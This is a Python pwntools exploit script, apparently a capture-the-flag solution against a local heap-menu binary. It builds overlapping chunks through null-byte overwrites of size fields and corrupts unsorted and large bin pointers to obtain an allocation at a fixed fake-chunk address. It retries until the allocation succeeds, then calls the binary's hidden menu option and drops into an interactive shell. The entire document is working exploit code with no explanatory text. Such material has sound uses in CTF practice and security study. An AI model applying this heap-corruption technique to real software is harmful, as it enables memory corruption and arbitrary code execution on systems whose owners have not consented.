from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Choice: '
def add(size):
	sla(menu, b'1')
	sla(b'size ?\n', byte(size))

def edit(idx, content):
	sla(menu, b'2')
	sla(b'Index ?\n', byte(idx))
	sda(b'Content: \n', content)

def dele(idx):
	sla(menu, b'3')
	sla(b'Index ?\n', byte(idx))

def shell(pa):
	sla(menu, b'666')
	sda(b'in\n', pa)

flag = True
while flag:
	#flag = False
	io = process("./pwn")
	add(0x18)  # 0
	add(0x4e8) # 1 unsorted bin chunk
	add(0xf8)  # 2

	add(0x18)  # 3

	add(0x18)  # 4
	add(0x4d8) # 5 --> large bin chunk
	add(0xf8)  # 6

	add(0x18)  # 7 --> avoid top_chunk

	dele(0)      # 0
	edit(1, b'\x00'*0x4e0+p64(0x510))
	dele(2)      # 2
	add(0x18)  # 0
	add(0x4e8) # 2 --> control unsorted bin chunk
	add(0xf8)  # 8

	dele(4)      # 4
	edit(5, b'\x00'*0x4d0+p64(0x500))
	dele(6)      # 6
	add(0x18)  # 4
	add(0x4d8) # 6 --> control large bin chunk
	add(0xf8)  # 9

	dele(5)      # 5
	dele(1)      # 1
	add(0x4e8) # 1
	dele(1)      # 1

	fake_chunk = 0xABCD0100 - 0x10
	edit(2, p64(0)+p64(fake_chunk))
	pay = p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
	edit(6, pay)
	try:
		add(0x48) # 1
		rut(b'1.')
		break
	except Exception as e:
		io.close()
		continue

edit(1, b'A'*0x30)
shell(b'A'*0x30)

#debug()
sh()
